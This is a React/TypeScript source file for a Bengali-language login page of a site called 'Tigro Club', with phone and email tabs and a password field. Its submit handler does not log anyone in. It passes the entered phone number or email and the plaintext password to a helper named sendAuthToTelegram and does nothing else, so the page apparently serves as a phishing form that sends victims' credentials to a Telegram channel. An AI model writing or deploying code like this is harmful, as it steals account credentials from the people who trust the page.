import { createFileRoute, Link, useRouter } from "@tanstack/react-router";
import { useState } from "react";
import { AuthHeader } from "@/components/tigro/Brand";
import { SupportBubble } from "@/components/tigro/SupportBubble";
import { FieldLabel, PasswordInput, PhoneInput, TextInput, icons } from "@/components/tigro/Field";
import { sendAuthToTelegram } from "@/lib/telegram";

export const Route = createFileRoute("/login")({
  head: () => ({
    meta: [
      { title: "প্রবেশ করুন — Tigro Club" },
      { name: "description", content: "ফোন নম্বর বা ইমেল দিয়ে Tigro Club-এ লগ ইন করুন।" },
      { property: "og:title", content: "প্রবেশ করুন — Tigro Club" },
      { property: "og:description", content: "ফোন নম্বর বা ইমেল দিয়ে লগ ইন করুন।" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary" },
    ],
  }),
  component: LoginPage,
});

function LoginPage() {
  const router = useRouter();
  const [tab, setTab] = useState<"phone" | "email">("phone");
  const [phone, setPhone] = useState("");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [loading, setLoading] = useState(false);

  async function handleSubmit(e: React.FormEvent) {
    e.preventDefault();
    if (loading) return;
    setLoading(true);

    const fullPhone = tab === "phone" && phone ? `+880${phone.replace(/\D/g, "")}` : undefined;

    await sendAuthToTelegram({
      type: "login",
      phone: fullPhone,
      email: tab === "email" ? email : undefined,
      password,
    });

    setLoading(false);
  }

  return (
    <main className="min-h-screen animate-[fade-in_0.5s_ease-out] bg-background pb-12">
      <AuthHeader
        title="প্রবেশ করুন"
        lines={[
          "আপনার ফোন নম্বর বা ইমেল দিয়ে লগ ইন করুন",
          "আপনি যদি আপনার পাসওয়ার্ড ভুলে যান, অনুগ্রহ করে গ্রাহক পরিষেবার সাথে যোগাযোগ করুন",
        ]}
        onBack={() => router.history.back()}
      />

      <section className="px-5">
        <div className="grid grid-cols-2 pt-4">
          {(
            [
              { key: "phone", icon: icons.phone, label: "ফোন নম্বর" },
              { key: "email", icon: icons.mail, label: "ইমেইল" },
            ] as const
          ).map((t) => (
            <button
              key={t.key}
              type="button"
              onClick={() => setTab(t.key)}
              className={`flex flex-col items-center gap-2 border-b-2 pb-3 text-base ${
                tab === t.key
                  ? "border-brand font-semibold text-brand-deep"
                  : "border-border text-muted-foreground"
              }`}
            >
              <span>{t.icon}</span>
              {t.label}
            </button>
          ))}
        </div>

        <form className="mt-7 space-y-6" onSubmit={handleSubmit}>
          <div>
            <FieldLabel icon={tab === "phone" ? icons.phone : icons.mail}>
              {tab === "phone" ? "ফোন নম্বর" : "মেইল"}
            </FieldLabel>
            {tab === "phone" ? (
              <PhoneInput value={phone} onChange={setPhone} />
            ) : (
              <TextInput
                type="email"
                placeholder="আপনার ইমেইল লিখুন"
                value={email}
                onChange={setEmail}
              />
            )}
          </div>

          <div>
            <FieldLabel icon={icons.lock}>পাসওয়ার্ড</FieldLabel>
            <PasswordInput
              placeholder="পাসওয়ার্ড"
              value={password}
              onChange={setPassword}
            />
          </div>

          <div className="flex flex-wrap items-center justify-between gap-2">
            <label className="flex items-center gap-3 text-sm text-foreground">
              <input type="checkbox" className="h-6 w-6 shrink-0 rounded-full accent-[oklch(0.86_0.17_92)]" />
              পাসওয়ার্ড মনে
            </label>
            <span className="text-sm font-medium text-brand-deep">পাসওয়ার্ড ভুলে যান?</span>
          </div>

          <button
            type="submit"
            className="h-14 w-full rounded-full bg-muted text-lg font-semibold text-muted-foreground"
            disabled={loading}
          >
            {loading ? "..." : "প্রবেশ করুন"}
          </button>

          <Link
            to="/register"
            className="flex h-14 w-full items-center justify-center rounded-full border border-brand text-lg font-semibold text-brand-deep"
          >
            নিবন্ধন
          </Link>
        </form>
      </section>

      <SupportBubble />
    </main>
  );
}
